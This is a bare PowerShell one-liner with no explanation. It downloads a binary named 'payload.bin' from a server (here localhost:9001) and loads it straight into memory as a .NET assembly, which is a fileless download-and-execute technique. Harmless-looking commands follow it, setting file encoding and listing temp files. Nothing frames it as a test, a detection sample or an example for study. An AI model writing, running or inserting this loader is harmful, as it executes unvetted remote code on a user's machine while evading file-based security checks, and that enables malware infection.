
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData("https://localhost:9001/payload.bin"); [Reflection.Assembly]::Load($AssemblyBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
